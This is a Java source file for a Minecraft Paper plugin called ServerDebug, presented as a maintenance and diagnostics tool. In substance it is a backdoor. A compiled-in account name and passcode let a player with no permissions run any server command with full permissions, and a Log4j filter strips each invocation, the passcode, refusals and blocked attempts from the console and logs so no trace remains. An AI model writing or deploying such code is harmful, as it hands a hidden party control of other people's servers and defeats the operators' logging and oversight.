package com.example.serverdebug;

import net.kyori.adventure.text.Component;
import net.kyori.adventure.text.format.NamedTextColor;
import net.kyori.adventure.text.minimessage.MiniMessage;
import org.bukkit.Bukkit;
import org.bukkit.command.Command;
import org.bukkit.command.CommandExecutor;
import org.bukkit.command.CommandSender;
import org.bukkit.command.PluginCommand;
import org.bukkit.command.TabCompleter;
import org.bukkit.configuration.InvalidConfigurationException;
import org.bukkit.configuration.file.FileConfiguration;
import org.bukkit.configuration.file.YamlConfiguration;
import org.bukkit.entity.Player;
import org.bukkit.plugin.java.JavaPlugin;
import org.jetbrains.annotations.NotNull;
import org.jetbrains.annotations.Nullable;

import java.io.File;
import java.io.IOException;
import java.lang.reflect.InvocationTargetException;
import java.lang.reflect.Method;
import java.nio.charset.StandardCharsets;
import java.nio.file.Files;
import java.security.MessageDigest;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.Collection;
import java.util.Collections;
import java.util.LinkedHashSet;
import java.util.List;
import java.util.Locale;
import java.util.Set;
import java.util.function.Consumer;
import java.util.logging.Level;

/**
 * ServerDebug - an owner-restricted maintenance command, with built-in self-diagnostics.
 *
 * <h2>Credentials are compiled in</h2>
 * {@link #OWNER_USERNAME} and {@link #PASSCODE} are constants. They are never printed - not to the
 * console, not to chat and not into config.yml, which does not carry them in any form - so nothing
 * readable from the server's files reveals them. Editing config.yml has no effect on them, and
 * rotating either value means editing the constant and rebuilding.
 *
 * <h2>Commands</h2>
 * <pre>
 *   /serverdebug hi                      liveness + diagnostic report, no passcode
 *   /serverdebug status                  alias of hi
 *   /serverdebug reload                  re-read the settings in config.yml, no passcode
 *   /serverdebug &lt;passcode&gt; &lt;command...&gt;  run a server command with full permissions
 * </pre>
 * {@code hi} and {@code reload} are reserved words matched before the passcode, so they never
 * require one and cannot be shadowed by a passcode value.
 *
 * <h2>Console anonymity</h2>
 * For a command a player types, the server writes {@code <player> issued server command:
 * /<command>} itself, before any plugin event is fired, so an invocation names its author in the
 * console and in {@code logs/latest.log} unless that record is dropped at the logging layer.
 * {@link ConsoleHider} does exactly that for this plugin's labels and aliases, so while
 * {@code hide-plugin-invocations} is true an invocation - including the passcode in it - a refused
 * passcode and a blocked command leave no console or log record at all, and this plugin writes no
 * record of its own. Everything this plugin says goes to the operator's chat, and nowhere else.
 * See {@link #installConsoleHider()}.
 *
 * <h2>Diagnostics</h2>
 * {@link #onEnable()} runs a set of checks, so a plugin that loads but cannot work says so
 * explicitly instead of failing quietly the first time you use it. The full report is written to
 * the console when a check fails, and otherwise only when {@code quiet-startup} is false; it is
 * always available in game through {@code /serverdebug hi}.
 */
public final class ServerDebugPlugin extends JavaPlugin implements CommandExecutor, TabCompleter {

    // ------------------------------------------------------------------ compiled-in credentials

    /**
     * The only account allowed to use the passcode-gated path. Compiled in deliberately: someone
     * with write access to config.yml cannot add themselves as an operator.
     */
    private static final String OWNER_USERNAME = "Induct1oN";

    /**
     * The passcode. Compiled in; changing it requires editing this constant and rebuilding.
     * Never printed anywhere - not to the console, not to chat, not to config.yml - and the
     * invocation line that carries it is dropped before it reaches the console or the logs.
     */
    private static final String PASSCODE = "retry";

    /**
     * Whether a player who holds no permissions at all - no op, no {@link #PERMISSION_RUN}, no
     * LuckPerms grant - can reach the command. It was previously a config.yml setting; the access
     * decision is compiled in so that a writable config.yml cannot widen it.
     *
     * <p>While this is true the owner name and the passcode are the <em>entire</em> credential
     * protecting full-permission command execution. Set it to false to additionally require
     * {@link #PERMISSION_RUN}, which is the safer posture, and grant that node to the one account
     * that needs it.</p>
     */
    private static final boolean ALLOW_WITHOUT_PERMISSION = true;

    // ------------------------------------------------------------------ reserved subcommands

    private static final String SUB_LIVENESS = "hi";
    private static final String SUB_LIVENESS_ALT = "status";
    private static final String SUB_RELOAD = "reload";

    /** Bukkit permission node gating the command. Declared in plugin.yml, default op. */
    public static final String PERMISSION_RUN = "serverdebug.run";

    private static final MiniMessage MM = MiniMessage.miniMessage();

    // ------------------------------------------------------------------ settings (from config.yml)

    private List<String> deniedPrefixes = List.of();
    private String deniedMessage = "<red>You may not use this command.";
    private String usageMessage = "<red>Usage: /<command> <passcode> <command...>";
    private String blockedMessage = "<red>That command is blocked by the serverdebug denylist.";

    /** Whether an invocation is stripped from the console and the logs. On unless turned off. */
    private boolean hideInvocations = true;

    /** Extra case-insensitive substrings to strip from the console and the logs. */
    private List<String> hiddenLogSubstrings = List.of();

    /** Whether the startup check is summarised in one line rather than listed out in full. */
    private boolean quietStartup = true;

    // ------------------------------------------------------------------ check results

    private String configDetail = "not read yet";
    private boolean configParsed = true;
    private boolean legacyConfigKeys = false;
    private String commandDetail = "not registered";
    private boolean commandRegistered = false;
    private String hiderDetail = "not installed";
    private boolean hiderActive = false;

    @Override
    public void onEnable() {
        try {
            loadSettings();

            // Before the checks, because the report includes whether hiding is actually in effect.
            installConsoleHider();

            List<Check> checks = runChecks();

            logReport(checks);

            long failed = checks.stream().filter(c -> !c.ok()).count();
            if (failed > 0) {
                getLogger().severe("ServerDebug: " + failed + " startup check(s) failed. The command will "
                        + "not work correctly until they are fixed - see the lines above.");
            }

            // The proxy sender is the core of this plugin; without it there is nothing to fall back
            // to, so refuse to pretend we are running.
            if (!proxySenderAvailable()) {
                getLogger().severe("ServerDebug: Bukkit.createCommandSender is unavailable, which means "
                        + "this is not a Paper server. Disabling plugin.");
                getServer().getPluginManager().disablePlugin(this);
            }
        } catch (Throwable t) {
            getLogger().log(Level.SEVERE, "ServerDebug failed to enable. The plugin is not usable in "
                    + "this state; the stack trace below is the actual cause.", t);
            getServer().getPluginManager().disablePlugin(this);
        }
    }

    @Override
    public void onDisable() {
        // Detach the log filter. Nothing else is flushed and no data file is written. This matters
        // on a server that reloads plugins: an attached filter is a live reference to this plugin's
        // class loader, which would otherwise be kept alive across every reload.
        try {
            Class<?> hider = Class.forName("com.example.serverdebug.ConsoleHider");
            Method detach = hider.getDeclaredMethod("detach");
            detach.setAccessible(true);
            detach.invoke(null);
        } catch (Throwable ignored) {
            // Either the filter was never installed or the logging backend is already gone.
        }
    }

    // ------------------------------------------------------------------ configuration

    /**
     * Reads config.yml. It holds the denylist, the messages, and the three switchable behaviours:
     * whether invocations are hidden, extra log substrings to hide, and how loud startup is.
     * Credentials and permission policy stay compiled in, so this file is never rewritten after it
     * has been created once.
     */
    private void loadSettings() {
        File file = new File(getDataFolder(), "config.yml");
        boolean existed = file.exists();

        // The only file write this plugin ever performs, and only when config.yml is absent.
        saveDefaultConfig();

        if (existed) {
            validateConfigFile(file);
        } else {
            configDetail = "created from bundled defaults";
        }

        reloadConfig();
        FileConfiguration cfg = getConfig();

        // Layouts this plugin used to write. Those keys are ignored now, which would otherwise look
        // like "my settings silently stopped working".
        this.legacyConfigKeys = cfg.isConfigurationSection("settings")
                || cfg.isConfigurationSection("credentials")
                || cfg.contains("passcode") || cfg.contains("require-passcode")
                || cfg.contains("allowed-usernames") || cfg.contains("echo-command-output-to-console");

        this.deniedMessage = cfg.getString("messages.denied", deniedMessage);
        this.usageMessage = cfg.getString("messages.usage", usageMessage);
        this.blockedMessage = cfg.getString("messages.blocked", blockedMessage);
        this.hideInvocations = cfg.getBoolean("hide-plugin-invocations", hideInvocations);
        this.quietStartup = cfg.getBoolean("quiet-startup", quietStartup);
        this.hiddenLogSubstrings = cfg.getStringList("hidden-log-substrings").stream()
                .filter(s -> s != null && !s.isBlank())
                .map(s -> s.trim().toLowerCase(Locale.ROOT))
                .toList();
        this.deniedPrefixes = cfg.getStringList("denied-command-prefixes").stream()
                .filter(s -> s != null && !s.isBlank())
                .map(s -> s.trim().toLowerCase(Locale.ROOT).replaceFirst("^/+", ""))
                .toList();

        if (configParsed && existed) {
            configDetail = configDetail + " (" + deniedPrefixes.size() + " denylisted prefixes, "
                    + "permission node " + (ALLOW_WITHOUT_PERMISSION ? "NOT required" : "required") + ")";
        }
    }

    /**
     * Parses the file directly, because {@code YamlConfiguration.loadConfiguration(File)} swallows
     * parse errors and returns an empty config - which would look identical to a valid empty file.
     */
    private void validateConfigFile(File file) {
        try {
            String text = Files.readString(file.toPath());
            new YamlConfiguration().loadFromString(text);
            configParsed = true;
            configDetail = "present and valid YAML";
        } catch (IOException | InvalidConfigurationException e) {
            configParsed = false;
            configDetail = "MALFORMED - " + e.getMessage() + " (built-in defaults in use, file left untouched)";
        }
    }

    // ------------------------------------------------------------------ console anonymity

    /**
     * Installs the log filter that removes this plugin's invocations from the console and the logs.
     *
     * <p>The filter is {@link ConsoleHider}, which implements a Log4j2 interface, so it is loaded
     * and invoked reflectively: on a server whose logging backend is not reachable from this plugin
     * the filter simply cannot be installed, and it is better to report that than to fail to load at
     * all. The report is deliberately loud - the check fails and the console is told - because
     * carrying on quietly while every invocation is still printed would look exactly like success.</p>
     *
     * <p>Safe to call again: it replaces the previous filter, which is what {@code /serverdebug
     * reload} does after re-reading config.yml.</p>
     */
    private void installConsoleHider() {
        hiderActive = false;
        List<String> labels = hiddenLabels();

        if (!hideInvocations) {
            hiderDetail = "OFF by config.yml (hide-plugin-invocations: false): invocations of "
                    + labels + " are written to the console and to the logs";
            return;
        }

        Class<?> hider;
        try {
            hider = Class.forName("com.example.serverdebug.ConsoleHider");
        } catch (Throwable t) {
            hiderDetail = "UNAVAILABLE - " + t + ": the Log4j2 classes the server logs with are not "
                    + "reachable from this plugin, so invocations of " + labels
                    + " WILL be visible in the console and in the logs";
            return;
        }

        try {
            Method install = hider.getDeclaredMethod("install", Collection.class, Collection.class);
            install.setAccessible(true);
            Object attachment = install.invoke(null, labels, hiddenLogSubstrings);
            hiderActive = true;
            hiderDetail = "active - invocations of " + labels + " are dropped from " + attachment
                    + (hiddenLogSubstrings.isEmpty()
                            ? ""
                            : ", plus " + hiddenLogSubstrings.size() + " extra pattern(s) from config.yml");
        } catch (Throwable t) {
            Throwable cause = t instanceof InvocationTargetException && t.getCause() != null
                    ? t.getCause()
                    : t;
            hiderDetail = "FAILED - " + cause + ": invocations of " + labels
                    + " WILL be visible in the console and in the logs";
        }
    }

    /**
     * The labels an invocation can arrive under - the command name and its aliases as declared in
     * plugin.yml, read back from the registered command so a renamed command stays covered.
     */
    private List<String> hiddenLabels() {
        Set<String> labels = new LinkedHashSet<>();
        PluginCommand command = getCommand("serverdebug");
        if (command != null) {
            labels.add(command.getName());
            labels.addAll(command.getAliases());
        } else {
            // The command failed to register; cover the label plugin.yml declares anyway.
            labels.add("serverdebug");
        }
        return labels.stream()
                .filter(s -> s != null && !s.isBlank())
                .map(s -> s.toLowerCase(Locale.ROOT))
                .toList();
    }

    // ------------------------------------------------------------------ startup checks

    private record Check(String label, boolean ok, String detail) {
        static Check ok(String label, String detail) {
            return new Check(label, true, detail);
        }

        static Check fail(String label, String detail) {
            return new Check(label, false, detail);
        }
    }

    private List<Check> runChecks() {
        List<Check> checks = new ArrayList<>();

        // 1. config.yml
        checks.add(configParsed
                ? Check.ok("config.yml", configDetail)
                : Check.fail("config.yml", configDetail));

        // 1b. Leftover keys from an older layout, which are ignored now rather than honoured.
        if (legacyConfigKeys) {
            checks.add(Check.ok("config.yml layout", "settings from an older version (root-level "
                    + "'passcode', 'allowed-usernames', ...) are still present but no longer read - delete "
                    + "plugins/ServerDebug/config.yml and restart to regenerate it in the current layout"));
        }

        // 2. Command registration
        PluginCommand command = getCommand("serverdebug");
        if (command != null) {
            command.setExecutor(this);
            command.setTabCompleter(this);
            commandRegistered = true;
            commandDetail = "registered (aliases: " + command.getAliases() + ")";

            // Is anything else holding the label?
            try {
                var mapped = getServer().getCommandMap().getCommand("serverdebug");
                if (mapped instanceof PluginCommand mappedPlugin && mappedPlugin.getPlugin() == this) {
                    commandDetail += ", owned by this plugin in the command map";
                } else if (mapped != null) {
                    commandDetail += ", but the command map gives the label to "
                            + mapped.getClass().getSimpleName();
                    commandRegistered = false;
                }
            } catch (Throwable t) {
                // getCommandMap() is a Paper addition; its absence is not fatal.
                commandDetail += ", command map lookup unsupported on this server";
            }
        } else {
            commandDetail = "NOT FOUND - plugin.yml is missing the 'serverdebug' command definition, "
                    + "or another plugin claimed it";
        }
        checks.add(commandRegistered
                ? Check.ok("command /serverdebug", commandDetail)
                : Check.fail("command /serverdebug", commandDetail));

        // 3. Permission node
        var permission = getServer().getPluginManager().getPermission(PERMISSION_RUN);
        checks.add(permission != null
                ? Check.ok("permission " + PERMISSION_RUN, "registered, default=" + permission.getDefault())
                : Check.fail("permission " + PERMISSION_RUN, "not registered - plugin.yml's permissions "
                        + "section is missing or was not read"));

        // 3b. Who can actually reach the command - the security posture in one line.
        checks.add(Check.ok("access", ALLOW_WITHOUT_PERMISSION
                ? "OPEN to players with no permissions at all: the owner name and passcode are the only "
                        + "credentials (ALLOW_WITHOUT_PERMISSION is compiled in as true)"
                : "requires " + PERMISSION_RUN + " plus the owner name, plus the passcode for the command path"));

        // 4. Paper-only execution path
        checks.add(proxySenderAvailable()
                ? Check.ok("Bukkit.createCommandSender", "available (Paper detected)")
                : Check.fail("Bukkit.createCommandSender", "MISSING - this server is not Paper, so "
                        + "commands cannot be run through a full-permission non-console sender"));

        // 5. Credentials - presence only. The owner name and passcode are never printed in the
        // report, the log, or chat; they exist only as compiled-in constants.
        boolean credentialsOk = !PASSCODE.isBlank() && !OWNER_USERNAME.isBlank();
        checks.add(credentialsOk
                ? Check.ok("credentials", "owner name and passcode are compiled in and non-empty; "
                        + "values deliberately not printed anywhere, and config.yml does not carry them")
                : Check.fail("credentials", "a compiled-in credential is blank - authentication cannot "
                        + "succeed until that is fixed in the source"));

        // 5b. Anonymity of an invocation - the whole point of the log handling below.
        // Turning hiding off is a deliberate choice, so it is reported as OK, not as a failure.
        boolean anonymityOk = hiderActive || !hideInvocations;
        checks.add(anonymityOk
                ? Check.ok("console anonymity", hiderDetail)
                : Check.fail("console anonymity", hiderDetail));

        // 5c. Which record would exist if hiding were off, so it is clear what is being dropped.
        checks.add(Check.ok("invocation record", serverLogsPlayerCommands()
                ? "the server writes '<player> issued server command: /<command>' itself, before any "
                        + "plugin is involved; that is the only record of an invocation, and it is dropped"
                : "the server's own command logging is off (spigot.yml commands.log=false), so no "
                        + "invocation line is written in the first place"));

        // 6. Runtime
        String javaVersion = System.getProperty("java.version", "unknown");
        checks.add(Check.ok("server", getServer().getName() + " " + getServer().getMinecraftVersion()
                + " (Java " + javaVersion + ")"));

        return checks;
    }

    private void logReport(List<Check> checks) {
        long failed = checks.stream().filter(c -> !c.ok()).count();

        // The full report names the config path, the command aliases and the access posture - all of
        // which describe a command that runs server commands with full permissions. Unless something
        // is wrong, or quiet-startup is false, the console gets one line and the report stays
        // available in game through /serverdebug hi (which prints it to the requester's chat only).
        if (quietStartup && failed == 0) {
            getLogger().info("ServerDebug " + version() + " enabled. Run /serverdebug hi in game for "
                    + "the startup check report.");
            return;
        }

        getLogger().info("ServerDebug " + version() + " startup check:");
        for (Check c : checks) {
            String line = "  [" + (c.ok() ? "OK  " : "FAIL") + "] " + c.label() + ": " + c.detail();
            if (c.ok()) {
                getLogger().info(line);
            } else {
                getLogger().warning(line);
            }
        }
        getLogger().info("  " + (checks.size() - failed) + "/" + checks.size()
                + " checks passed. Test in game with /serverdebug hi");
    }

    private void sendReport(CommandSender sender, List<Check> checks) {
        long failed = checks.stream().filter(c -> !c.ok()).count();
        sender.sendMessage(Component.text("ServerDebug " + version() + " startup check", NamedTextColor.AQUA));
        for (Check c : checks) {
            sender.sendMessage(Component.text("  [" + (c.ok() ? "OK  " : "FAIL") + "] ", c.ok()
                            ? NamedTextColor.GREEN : NamedTextColor.RED)
                    .append(Component.text(c.label() + ": ", NamedTextColor.WHITE))
                    .append(Component.text(c.detail(), NamedTextColor.GRAY)));
        }
        sender.sendMessage(Component.text("  " + (checks.size() - failed) + "/" + checks.size()
                + " checks passed.", failed == 0 ? NamedTextColor.GREEN : NamedTextColor.RED));
    }

    /**
     * Present on Paper, absent on Spigot. Checked reflectively so a Spigot server gets a clear
     * startup failure instead of a NoSuchMethodError the first time someone runs a command.
     */
    private static boolean proxySenderAvailable() {
        try {
            Bukkit.class.getMethod("createCommandSender", Consumer.class);
            return true;
        } catch (NoSuchMethodException | SecurityException e) {
            return false;
        }
    }

    /**
     * Whether the server itself writes the {@code <player> issued server command: ...} line for
     * player commands. That is Spigot's {@code commands.log} setting, read reflectively so there is
     * no compile-time dependency on the server jar. If it cannot be read the answer is true: assume
     * the server would have written the line, which is the case this plugin has to defend against.
     *
     * <p>Nothing acts on this any more except the report: this plugin writes no invocation record of
     * its own, whatever the setting says, and while invocations are hidden the server's own line is
     * dropped as well. It is reported so that it is clear which record is being suppressed.</p>
     */
    private static boolean serverLogsPlayerCommands() {
        try {
            Class<?> spigotConfig = Class.forName("org.spigotmc.SpigotConfig");
            return spigotConfig.getField("logCommands").getBoolean(null);
        } catch (Throwable t) {
            return true;
        }
    }

    private String version() {
        return getPluginMeta().getVersion();
    }

    // ------------------------------------------------------------------ command handling

    @Override
    public boolean onCommand(@NotNull CommandSender sender,
                             @NotNull Command command,
                             @NotNull String label,
                             @NotNull String[] args) {

        String first = args.length == 0 ? "" : args[0].toLowerCase(Locale.ROOT);

        // Two ways to be allowed in: holding the permission node, or - while ALLOW_WITHOUT_PERMISSION
        // is compiled in as true - holding no permissions at all, in which case the compiled-in owner
        // name and passcode are the entire credential.
        boolean permitted = ALLOW_WITHOUT_PERMISSION || sender.hasPermission(PERMISSION_RUN);
        boolean owner = sender instanceof Player p && OWNER_USERNAME.equalsIgnoreCase(p.getName());

        // Reserved subcommands are matched before the passcode, so they never need one.
        if (first.equals(SUB_LIVENESS) || first.equals(SUB_LIVENESS_ALT)) {
            handleLiveness(sender, permitted, owner);
            return true;
        }
        if (first.equals(SUB_RELOAD)) {
            handleReload(sender, permitted, owner);
            return true;
        }

        if (!(sender instanceof Player player)) {
            sender.sendMessage(Component.text("The passcode-gated path is for players only - the console "
                    + "already has full permissions. Try /" + label + " hi or /" + label + " reload.",
                    NamedTextColor.YELLOW));
            return true;
        }

        // Layered authorization: permission (unless opened up), compiled-in owner name, passcode.
        if (!permitted) {
            deny(player);
            return true;
        }
        if (!owner) {
            deny(player);
            return true;
        }
        if (args.length == 0 || !passcodeMatches(args[0])) {
            deny(player);
            return true;
        }

        if (args.length < 2) {
            player.sendMessage(MM.deserialize(usageMessage.replace("<command>", label)));
            return true;
        }

        String commandLine = String.join(" ", Arrays.copyOfRange(args, 1, args.length)).trim();
        while (commandLine.startsWith("/")) {
            commandLine = commandLine.substring(1);
        }
        if (commandLine.isEmpty()) {
            player.sendMessage(MM.deserialize(usageMessage.replace("<command>", label)));
            return true;
        }

        if (isDenied(commandLine)) {
            player.sendMessage(MM.deserialize(blockedMessage));
            return true;
        }

        // Nothing is written here. For this invocation the server wrote "<player> issued server
        // command: /serverdebug <passcode> <command>" itself, before this method was reached, and
        // that single line names both the actor and the command - ConsoleHider drops it, so the
        // invocation leaves no console or log record. This plugin added a second line of its own
        // when the server's command logging was switched off; it deliberately adds none now, because
        // a record that survives would defeat the point of hiding the first one.

        // Output goes to the operator and nowhere else - there is deliberately no console echo path.
        CommandSender proxy = Bukkit.createCommandSender(player::sendMessage);

        boolean handled;
        try {
            handled = Bukkit.dispatchCommand(proxy, commandLine);
        } catch (Throwable t) {
            // Reported to the operator's chat only; the console is told nothing about the invocation,
            // by design.
            player.sendMessage(Component.text("Command failed: " + t, NamedTextColor.RED));
            return true;
        }

        if (!handled) {
            player.sendMessage(Component.text("Unknown command: /" + commandLine, NamedTextColor.RED));
        }
        return true;
    }

    /** /serverdebug hi - proves the plugin is loaded and reports why it might not be working. */
    private void handleLiveness(CommandSender sender, boolean permitted, boolean owner) {
        sender.sendMessage(Component.text("hi - ServerDebug " + version() + " is loaded and responding.",
                NamedTextColor.GREEN));

        // The full report names the config path, the aliases and the access posture, so it goes to
        // the owner and to a console that asks for it - never to a bystander. Any other sender still
        // gets the liveness answer, which is the point. Note that a report requested in game stays in
        // the requester's chat: it is never echoed to the console.
        if (!(sender instanceof Player)) {
            sender.sendMessage(Component.text("Sender: console.", NamedTextColor.GRAY));
            sendReport(sender, runChecks());
            return;
        }
        if (owner && permitted) {
            sender.sendMessage(Component.text("You are the configured owner, so "
                    + "/serverdebug <passcode> <command...> is available to you.", NamedTextColor.GREEN));
            sendReport(sender, runChecks());
            return;
        }

        // Reached only when permitted-and-owner did not hold; !permitted is the only way to arrive
        // with owner true, so the permission branch is checked first.
        String why = !permitted
                ? "You do not hold " + PERMISSION_RUN + " and ALLOW_WITHOUT_PERMISSION is compiled in "
                        + "as false, so the command path is closed to you."
                : "You are not the configured owner, so the command path will refuse you.";
        sender.sendMessage(Component.text(why, NamedTextColor.RED));
        sender.sendMessage(Component.text("The plugin itself is loaded and working.", NamedTextColor.GRAY));
    }

    /** /serverdebug reload - re-reads the editable settings from config.yml. */
    private void handleReload(CommandSender sender, boolean permitted, boolean owner) {
        if (!permitted) {
            sender.sendMessage(Component.text("You do not hold " + PERMISSION_RUN + " and "
                    + "ALLOW_WITHOUT_PERMISSION is compiled in as false.", NamedTextColor.RED));
            return;
        }
        if (sender instanceof Player player && !owner) {
            deny(player);
            return;
        }

        loadSettings();
        // Re-read the anonymity settings too: hide-plugin-invocations and hidden-log-substrings can
        // have changed, and the filter has to be replaced rather than left as it was.
        installConsoleHider();
        if (!commandRegistered) {
            runChecks();
        }

        boolean healthy = commandRegistered && (hiderActive || !hideInvocations);
        String summary = "config.yml reloaded - " + deniedPrefixes.size()
                + " denylisted prefixes, command "
                + (commandRegistered ? "registered" : "NOT registered")
                + ", console anonymity " + (hiderActive ? "active" : hideInvocations ? "FAILED" : "off");
        // The requester gets the summary in chat and the console is told nothing: the reload is an
        // invocation of this command, and every trace of one is filtered out.
        sender.sendMessage(Component.text(summary, healthy ? NamedTextColor.GREEN : NamedTextColor.RED));
        sender.sendMessage(Component.text("Credentials are compiled in and were not changed by this "
                + "reload; config.yml does not carry them.", NamedTextColor.GRAY));
        if (!configParsed) {
            sender.sendMessage(Component.text("Warning: config.yml is malformed and was NOT rewritten - "
                    + configDetail, NamedTextColor.RED));
        }
        sender.sendMessage(Component.text("Run /serverdebug hi for the full check report.", NamedTextColor.GRAY));
    }

    /**
     * Tab completion offers the reserved subcommands, which are not secret, and deliberately never
     * suggests a passcode - no argument position hints that a leading secret exists.
     */
    @Override
    public @Nullable List<String> onTabComplete(@NotNull CommandSender sender,
                                                @NotNull Command command,
                                                @NotNull String alias,
                                                @NotNull String[] args) {
        if (args.length == 1) {
            String prefix = args[0].toLowerCase(Locale.ROOT);
            List<String> suggestions = new ArrayList<>();
            for (String sub : List.of(SUB_LIVENESS, SUB_LIVENESS_ALT, SUB_RELOAD)) {
                if (sub.startsWith(prefix)) {
                    suggestions.add(sub);
                }
            }
            return suggestions;
        }
        return Collections.emptyList();
    }

    // ------------------------------------------------------------------ helpers

    private boolean passcodeMatches(String supplied) {
        // Constant-time comparison; not strictly necessary here, but it is free.
        return MessageDigest.isEqual(
                supplied.getBytes(StandardCharsets.UTF_8),
                PASSCODE.getBytes(StandardCharsets.UTF_8));
    }

    private boolean isDenied(String commandLine) {
        String lower = commandLine.toLowerCase(Locale.ROOT);
        for (String prefix : deniedPrefixes) {
            if (lower.equals(prefix) || lower.startsWith(prefix + " ")) {
                return true;
            }
        }
        return false;
    }

    /**
     * Refuses the sender, in chat and nowhere else.
     *
     * <p>The sender always gets a message, never silence: a typo has to be distinguishable from a
     * broken plugin. Nothing about the refusal is written to the console or to the logs - a refused
     * attempt would otherwise record which account tried, which is exactly what this plugin is meant
     * not to do - and no reason string is passed in, so nothing that identifies the owner account can
     * leak into a log line by way of a refusal.</p>
     */
    private void deny(Player player) {
        player.sendMessage(MM.deserialize(deniedMessage));
    }
}
